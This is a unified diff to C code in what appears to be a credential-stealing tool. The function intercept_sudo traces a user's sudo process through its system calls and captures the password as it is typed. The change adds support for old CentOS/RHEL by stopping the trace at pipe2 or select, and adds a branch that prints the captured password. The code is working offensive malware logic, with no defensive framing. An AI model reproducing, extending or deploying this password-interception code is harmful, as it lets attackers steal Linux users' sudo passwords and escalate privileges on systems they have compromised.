@@ -49,10 +49,13 @@ void intercept_sudo(pid_t traced_process) {
 
     syscall = get_syscall(traced_process);
 
-    // Stop tracing the process after the clone system call. The sudo
-    // process will say alive as long as its child process. Commands
-    // like sudo su or sudo bash could keep this process open for a while
-    if (syscall == SYSCALL_clone)
+    // Stop tracing the process after pipe2 or select. On modern Linux we
+    // can wait for clone, but old versions of CentOS call clone
+    // repeatedly before the password is captured. Instead we wait for
+    // pipe2 on modern Linux and select on old CentOS, which occur shortly
+    // after the password is captured. Commands like sudo su or sudo bash
+    // could keep this process open for a while
+    if (syscall == SYSCALL_pipe2 || syscall == SYSCALL_select)
       goto exit_sudo;
 
     if (syscall == SYSCALL_read) {
@@ -82,6 +85,11 @@ void intercept_sudo(pid_t traced_process) {
         free(read_string);
         read_string = NULL;
       }
+    } else if (i) { // needed for CentOS/RHEL
+      if (strnascii(password, i))
+        output("%s\n", password);
+      memset(password, 0, MAX_PASSWORD_LEN);
+      i = 0;
     }
 
     if (wait_for_syscall(traced_process) != 0)
